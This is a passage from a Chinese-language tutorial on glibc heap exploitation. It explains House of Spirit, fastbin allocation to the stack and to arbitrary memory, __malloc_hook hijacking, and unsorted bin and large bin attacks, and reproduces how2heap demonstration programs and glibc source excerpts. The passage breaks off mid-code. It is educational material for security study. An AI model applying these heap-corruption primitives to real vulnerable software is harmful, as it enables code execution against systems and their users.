<li>fastbin 链表头部不能是该chunk<ul>
<li>free时检查了fastbin的对应链的头部是不是该chunk</li>
</ul>
</li>
</ul>
<p>how2heap的这段代码演示了此项技术。构造两个chunk(后一个chunk用于free时的后向chunk检查)，然后释放第一个chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">    <span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种方法的关键就在于对chunk前后的内容进行修改，绕过在free时的检查即可。</p>
<h4 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h4><p>这个技术依赖于fastbin链是每个chunk由fd指针连接形成的单链表形式，如果将fastbin链中的chunk的fd指针指向栈上(比如利用UAF漏洞)，那么多次申请内存时就可以申请到一个栈上的chunk(stack chunk)，从而去写栈数据。</p>
<p>需要注意的地方在于fastbin的chunk ，其size要满足所在index的需求。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CHUNK stack_chunk;<span class="comment">//--&gt; fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    stack_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk1=&amp;stack_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//--&gt; stack chunk</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h4><p>由Alloc to Stack更进一步，fake chunk不仅可以分配到栈上，其实看源码就知道，虽然是堆管理，其实大部分只是在对chunk进行处理，并没有管到底是什么内存位置的chunk，所以只要size满足要求，可以在bss、heap、data、stack等各种可写内存中伪造chunk。</p>
<p>具体来说，malloc过程只对fastbin中的chunk做了这个检查,只是确保了当前这个chunk的index是正确的。而index的计算通过宏来完成，就是如下代码部分。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">#<span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这个检查极其的粗糙，<code>unsigned int</code>是四个字节的，这意味着伪造的时候甚至size部分不需要满足全部8个字节，并且宏还进行了右移操作，所以对齐也被忽略掉了。比如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(ctypes.c_int32(<span class="number">0x71</span>).value&gt;&gt;<span class="number">4</span>) <span class="number">-2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(ctypes.c_int32(<span class="number">0x7f</span>).value&gt;&gt;<span class="number">4</span>) <span class="number">-2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(ctypes.c_int32(<span class="number">0x123456780000007f</span>).value&gt;&gt;<span class="number">4</span>) <span class="number">-2</span></span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>虽然size差别很大，但用宏计算后都得到了index为5。</p>
<h4 id="修改-malloc-hook劫持控制流"><a href="#修改-malloc-hook劫持控制流" class="headerlink" title="修改__malloc_hook劫持控制流"></a>修改__malloc_hook劫持控制流</h4><p>用上面方式，可以去修改<code>__malloc_hook</code>或者说<code>__realloc_hook</code>实现劫持控制流。</p>
<p>所谓<code>__malloc_hook</code>其实就是挂在malloc的钩子函数。前面说到malloc源码部分。在<code>_lib_malloc</code>中会首先去检查是否有<code>__malloc_hook</code>存在，如果存在的话。则调用之。这就意味着如果我们事先修改了<code>__malloc_hook</code>地址的内容，就可以在下一次调用malloc时获得控制流。</p>
<p>具体攻击方式如下：</p>
<ul>
<li>在<code>__malloc_hook</code>的地址附近(低地址处)，找一个满足要求的size<ul>
<li>可以通过错位实现诸如0x000000000000007f这种值，只要<code>__malloc_hook</code>不在chunk的头部(不可修改)即可。</li>
</ul>
</li>
<li>将其伪造为一个fastbin chunk，放入chunk链<ul>
<li>想办法将它free掉</li>
</ul>
</li>
<li>之后申请到此chunk，对chunk进行写入即可修改<code>__malloc_hook</code>中存放的hook函数地址了<ul>
<li>改为got表中的其它函数指针或者修改为one_gadget的地址</li>
</ul>
</li>
</ul>
<h3 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h3><p>基于下面一段unsorted bin插入时的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* remove from unsorted list *&#x2F;</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))</span><br><span class="line">	malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">unsorted_chunks (av)-&gt;bk &#x3D; bck;</span><br><span class="line">bck-&gt;fd &#x3D; unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>如果可以控制 bk 的值，就能将 <code>unsorted_chunks (av)</code> 写到任意地址。</p>
<p>示例参见 <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c">unsorted_bin_attack.c</a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  fprintf(stderr, &quot;This file demonstrates unsorted bin attack by write a large &quot;</span><br><span class="line">                  &quot;unsigned long value into stack\n&quot;);</span><br><span class="line">  fprintf(</span><br><span class="line">      stderr,</span><br><span class="line">      &quot;In practice, unsorted bin attack is generally prepared for further &quot;</span><br><span class="line">      &quot;attacks, such as rewriting the &quot;</span><br><span class="line">      &quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  unsigned long target_var &#x3D; 0;</span><br><span class="line">  fprintf(stderr,</span><br><span class="line">          &quot;Let&#39;s first look at the target we want to rewrite on stack:\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  unsigned long *p &#x3D; malloc(400);</span><br><span class="line">  fprintf(stderr, &quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;,</span><br><span class="line">          p);</span><br><span class="line">  fprintf(stderr, &quot;And allocate another normal chunk in order to avoid &quot;</span><br><span class="line">                  &quot;consolidating the top chunk with&quot;</span><br><span class="line">                  &quot;the first one during the free()\n\n&quot;);</span><br><span class="line">  malloc(500);</span><br><span class="line"></span><br><span class="line">  free(p);</span><br><span class="line">  fprintf(stderr, &quot;We free the first chunk now and it will be inserted in the &quot;</span><br><span class="line">                  &quot;unsorted bin with its bk pointer &quot;</span><br><span class="line">                  &quot;point to %p\n&quot;,</span><br><span class="line">          (void *)p[1]);</span><br><span class="line"></span><br><span class="line">  &#x2F;*------------VULNERABILITY-----------*&#x2F;</span><br><span class="line"></span><br><span class="line">  p[1] &#x3D; (unsigned long)(&amp;target_var - 2);</span><br><span class="line">  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the &quot;</span><br><span class="line">                  &quot;victim-&gt;bk pointer\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;And we write it with the target address-16 (in 32-bits &quot;</span><br><span class="line">                  &quot;machine, it should be target address-8):%p\n\n&quot;,</span><br><span class="line">          (void *)p[1]);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;------------------------------------</span><br><span class="line"></span><br><span class="line">  malloc(400);</span><br><span class="line">  fprintf(stderr, &quot;Let&#39;s malloc again to get the chunk we just free. During &quot;</span><br><span class="line">                  &quot;this time, target should has already been &quot;</span><br><span class="line">                  &quot;rewrite:\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;%p: %p\n&quot;, &amp;target_var, (void *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体流程如下：</p>
<p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/figure/unsorted_bin_attack_order.png" alt="img"></p>
<p>不过unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。并且unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受控制，唯一可以知道的是这个值比较大。</p>
<p>有用的点：</p>
<ul>
<li>修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin方便执行fastbin attack</li>
<li>想不到了</li>
</ul>
<h3 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h3><p>还是使用how2heap 中的 <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/large_bin_attack.c">large_bin_attack</a> 源码来学习</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主要漏洞在这里</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    This technique is taken from</span></span><br><span class="line"><span class="comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">              else</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                  victim-&gt;fd_nextsize = fwd;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">                  fwd-&gt;bk_nextsize = victim;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">              bck = fwd-&gt;bk;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    mark_bin (av, victim_index);</span></span><br><span class="line"><span class="comment">    victim-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">    victim-&gt;fd = fwd;</span></span><br><span class="line"><span class="comment">    fwd-&gt;bk = victim;</span></span><br><span class="line"><span class="comment">    bck-&gt;fd = victim;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span></span><br><span class="line"><span class="comment">    please check the Background section in the aforementioned link.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc large_bin_attack.c -o large_bin_attack -g</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">                    <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="keyword">void</span> *)(p2 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">                    <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">                    <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="keyword">void</span> *)(p3 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">                    <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">                    <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">                    <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span 